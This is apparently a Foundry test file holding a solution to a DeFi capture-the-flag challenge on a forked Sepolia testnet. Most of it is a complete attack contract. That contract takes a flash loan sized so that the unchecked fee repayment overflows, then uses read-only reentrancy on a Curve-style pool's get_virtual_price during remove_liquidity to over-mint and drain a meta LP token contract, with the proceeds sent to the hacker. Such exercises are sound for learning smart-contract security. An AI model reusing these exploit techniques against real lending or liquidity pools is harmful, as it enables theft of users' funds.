// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CurvePool.sol";
import "../src/CurveToken.sol";
import "../src/interfaces/ILendingPool.sol";
import "../src/MetaPoolToken.sol";
import "../src/interfaces/IERC3156.sol";
import "forge-std/console.sol";

contract Challenge is Test {
    ILendingPool public wethLendingPool;
    CurvePool public swapPoolEthWeth;
    CurveToken public lpToken;
    IWETH public weth;
    MetaPoolToken public metaToken;
    address hacker;
    address alice;
    address bob;

    function setUp() public {
        vm.createSelectFork("https://sepolia.gateway.tenderly.co");

        weth = IWETH(payable(0x1194A239875cD36C9B960FF2d3d8d0f800435290));
        wethLendingPool = ILendingPool(0x66Df966E887e73b2f46456e062213B0C0fB42037);
        assertEq(address(wethLendingPool.WETH()), address(weth));
        assertEq(address(wethLendingPool.WETH()), address(weth));
        lpToken = new CurveToken();
        swapPoolEthWeth = new CurvePool(
            msg.sender, 
            [
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                address(weth)
            ],
            address(lpToken), 
            5,
            4000000,
            5000000000
        );
        lpToken.initialize(address(swapPoolEthWeth));
        metaToken = new MetaPoolToken(lpToken, swapPoolEthWeth);
        // deal(address(lpToken), address(metaToken), 10000 ether, true);

        hacker = makeAddr("hacker");
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        uint[2] memory amounts;// = [10 ether, 10 ether];
        amounts[0] = 10 ether;
        amounts[1] = 10 ether;

        deal(alice, 20 ether);
        vm.startPrank(alice);
        
        weth.deposit{value: 10 ether}();
        assertEq(weth.balanceOf(alice), 10 ether, "alice failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 10 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(alice));
        assertGt(metaToken.balanceOf(alice),0);
        vm.stopPrank();

        // amounts = [20 ether, 20 ether];
        amounts[0] = 20 ether;
        amounts[1] = 20 ether;

        deal(bob, 40 ether);
        vm.startPrank(bob);
        
        weth.deposit{value: 20 ether}();
        assertEq(weth.balanceOf(bob), 20 ether, "bob failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 20 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(bob));
        assertGt(metaToken.balanceOf(bob),0);
        vm.stopPrank();

        // Provide initial liquidity to lending pool (and lots of it!)
        deal(address(this), type(uint256).max - 70 ether);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(wethLendingPool), weth.balanceOf(address(this)));

        // Provide hacker with some ETH to start with
        deal(hacker, 10 ether);
    }

    function testHack() public {
        uint lendingPoolWethBalance = weth.balanceOf(address(wethLendingPool));
        
        vm.startPrank(hacker, hacker);

        // Deploy AttackContract and transfer 10 ethers to it
        AttackContract attackContract = new AttackContract{value: 10 ether}(address(this));
        console.log("Attack contract is deployed to: ", address(attackContract));
        console.log("All 10 ethers are transferred to the attack contract.");
        attackContract.flashLoan();

        vm.stopPrank();

        console.log("Hacker ETH balance at the end: ", address(hacker).balance);
        console.log("WETH lending pool WETH balance: ", weth.balanceOf(address(wethLendingPool)));
        console.log("Division: ", address(hacker).balance / weth.balanceOf(address(wethLendingPool)));

        assertLt(weth.balanceOf(address(wethLendingPool)), lendingPoolWethBalance, "Did not steal WETH from LendingPool"); // Done!
        assertApproxEqAbs(lpToken.balanceOf(address(metaToken)), 0, 1e5, "Did not completely drain LP tokens from MetaPoolToken");
        assertApproxEqRel(address(hacker).balance / weth.balanceOf(address(wethLendingPool)), 200, 5, "Did not obtain approx. 200x as much ETH as the final WETH lending pool balance");
    }
}

contract AttackContract {

    address public owner;
    Challenge public challenge;
    IWETH weth = IWETH(payable(0x1194A239875cD36C9B960FF2d3d8d0f800435290));
    ILendingPool public wethLendingPool = ILendingPool(0x66Df966E887e73b2f46456e062213B0C0fB42037);
    CurvePool public swapPoolEthWeth;
    CurveToken public lpToken;
    MetaPoolToken public metaToken;
    uint256 numberOfLPTokens;
    uint256 overflowedRepay;
    uint256 flashLoanAmount;
    uint256 fee;
    uint256 maxOverflowedRepay;

    bytes32 constant private RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(address _challenge) payable {
        owner = msg.sender;
        challenge = Challenge(_challenge);
        swapPoolEthWeth = challenge.swapPoolEthWeth();
        lpToken = challenge.lpToken();
        metaToken = challenge.metaToken();
    }

    // Get max flash loan and overflow it with fee (so we payback a small amount)
    function flashLoan() external {

        uint256 maxFlashLoan = wethLendingPool.maxFlashLoan(address(weth));
        uint256 maxFee = wethLendingPool.flashFee(address(weth), maxFlashLoan);

        unchecked {
            flashLoanAmount = type(uint256).max / 1005 * 1000 + 1005;
            fee = wethLendingPool.flashFee(address(weth), flashLoanAmount);
            overflowedRepay = flashLoanAmount + fee;
        }

        unchecked {
            maxOverflowedRepay = maxFlashLoan + maxFee;
        }

        console.log("maxFlashLoan: ", maxFlashLoan);
        console.log("maxFee: ", maxFee);
        console.log("flashLoanAmount: ", flashLoanAmount);
        console.log("fee: ", fee);
        console.log("overflowedRepay: ", overflowedRepay);
        console.log("Profit exploited from the lending pool: ", flashLoanAmount - overflowedRepay);
        console.log("Profit if borrow maxFlashLoan: ", maxFlashLoan - maxOverflowedRepay);

        weth.approve(address(wethLendingPool), type(uint256).max); // Lending pool does transferFrom when payback
        
        // Borrowing smaller amount is more lucrative than borrowing maxFlashLoan
        bool success = wethLendingPool.flashLoan(IERC3156FlashBorrower(address(this)), address(weth), flashLoanAmount, bytes(""));
        require(success, "Flash loan failed.");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32)
    {
        console.log("Flash loan received!");
        console.log("ETH balance in attack contract: ", address(this).balance / 10 ** 18);
        console.log("WETH balance in attack contract: ", ERC20(address(weth)).balanceOf(address(this)) / 10 ** 18);

        // WETH -> ETH
        weth.withdraw(ERC20(address(weth)).balanceOf(address(this)) - 1);
        console.log("ETH balance in attack contract after swap: ", address(this).balance / 10 ** 18);
        console.log("WETH balance in attack contract after swap: ", ERC20(address(weth)).balanceOf(address(this)));
        
        pwn();

        // Transfer leftover ETH back to hacker
        payable(owner).transfer(address(this).balance);

        return RETURN_VALUE;
    }

    function pwn() public payable {

        /* Attack plan
        1. Call `add_liquidity()` with some huge number
        2. Log `get_virtual_price()`
        3. Call `remove_liquidity()` -> trigger read-only reentrancy
        4. Log `get_virtual_price()` during `remove_liquidity()`: should go higher
        */

        // Step 1: Call `add_liquidity()`
        weth.approve(address(swapPoolEthWeth), type(uint256).max);
        uint256 ethToDeposit = address(this).balance / 10 ** 54 + 2 * 10 ** 12 + 9 * 10 ** 11;
        console.log("ethToDeposit: ", ethToDeposit);

        uint256[2] memory amounts = [
            ethToDeposit /*ETH*/,
            1 /*WETH*/
        ];
        numberOfLPTokens = swapPoolEthWeth.add_liquidity{value: ethToDeposit}(amounts, 1); // msg.value must match amounts[0]
        console.log("numberOfLPTokens: ", numberOfLPTokens);
        console.log("lpToken balance in attack contract before remove_liquidity(): ", lpToken.balanceOf(address(this)));

        // Step 2: Log `get_virtual_price()` and stake
        console.log("The virtual price before remove_liquidity(): ", swapPoolEthWeth.get_virtual_price());

        // Step 3: Call `remove_liquidity()` -> trigger read-only reentrancy
        uint256[2] memory _min_amounts = [uint(0), uint(0)];
        uint256[2] memory returnData = swapPoolEthWeth.remove_liquidity(numberOfLPTokens / 2 + 10 ** 22, _min_amounts);
        console.log("eth refund from remove_liquidity(): ", returnData[0]);
        console.log("weth refund from remove_liquidity(): ", returnData[1]);
        
        // Dump Meta LP Token
        console.log("metaToken contract lpToken balance: ", lpToken.balanceOf(address(metaToken)));
        metaToken.burn(lpToken.balanceOf(address(metaToken)) * swapPoolEthWeth.get_virtual_price() / 1e18);
        console.log("metaToken contract lpToken balance after dump: ", lpToken.balanceOf(address(metaToken)));
        console.log("WETH balance after dump", weth.balanceOf(address(this)));
    }

    receive() external payable {
        if (msg.sender == address(swapPoolEthWeth)) {

            console.log("The virtual price during remove_liquidity(): ", swapPoolEthWeth.get_virtual_price());
            console.log("lpToken balance in attack contract during remove_liquidity(): ", lpToken.balanceOf(address(this)));
            
            // Profit! Mint Meta LP Tokens (more than expected)
            lpToken.approve(address(metaToken), type(uint256).max); // MetaPoolToken.mint() has transferFrom for lpToken
            metaToken.mint(lpToken.balanceOf(address(this)));
            console.log("metaToken balance in the attack contract: ", metaToken.balanceOf(address(this)));
        }
    }
}